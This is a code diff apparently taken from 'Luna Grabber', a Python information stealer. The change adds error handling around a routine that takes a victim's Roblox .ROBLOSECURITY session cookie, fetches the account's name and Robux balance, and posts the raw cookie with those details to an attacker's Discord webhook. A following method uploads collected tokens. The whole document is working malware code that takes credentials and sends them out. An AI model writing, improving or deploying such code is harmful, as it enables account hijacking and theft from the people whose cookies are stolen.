@@ -380,40 +380,49 @@ class Discord:
                     pass
                 else:
                     headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-                    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
-                    data = {
-                        "embeds": [
-                            {
-                                "title": "Roblox Info",
-                                "color": 5639644,
-                                "fields": [
-                                    {
-                                        "name": "<:roblox_icon:1041819334969937931> Name:",
-                                        "value": f"`{info['UserName']}`",
-                                        "inline": True
+                    info = None
+                    try:
+                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
+                        response.raise_for_status()
+                        info = response.json()
+                    except requests.exceptions.HTTPError:
+                        pass
+                    except requests.exceptions.RequestException:
+                        pass
+                    if info is not None:
+                        data = {
+                            "embeds": [
+                                {
+                                    "title": "Roblox Info",
+                                    "color": 5639644,
+                                    "fields": [
+                                        {
+                                            "name": "<:roblox_icon:1041819334969937931> Name:",
+                                            "value": f"`{info['UserName']}`",
+                                            "inline": True
+                                        },
+                                        {
+                                            "name": "<:robux_coin:1041813572407283842> Robux:",
+                                            "value": f"`{info['RobuxBalance']}`",
+                                            "inline": True
+                                        },
+                                        {
+                                            "name": "🍪 Cookie:",
+                                            "value": f"`{robo_cookie}`"
+                                        }
+                                    ],
+                                    "thumbnail": {
+                                        "url": info['ThumbnailUrl']
                                     },
-                                    {
-                                        "name": "<:robux_coin:1041813572407283842> Robux:",
-                                        "value": f"`{info['RobuxBalance']}`",
-                                        "inline": True
+                                    "footer": {
+                                        "text": "Luna Grabber | Created By Smug"
                                     },
-                                    {
-                                        "name": "🍪 Cookie:",
-                                        "value": f"`{robo_cookie}`"
-                                    }
-                                ],
-                                "thumbnail": {
-                                    "url": info['ThumbnailUrl']
-                                },
-                                "footer": {
-                                    "text": "Luna Grabber | Created By Smug"
-                                },
-                            }
-                        ],
-                        "username": "Luna",
-                        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
-                    }
-                    requests.post(webhook, json=data)
+                                }
+                            ],
+                            "username": "Luna",
+                            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                        }
+                        requests.post(webhook, json=data)
 
     def upload(self, webhook):
         for token in self.tokens:
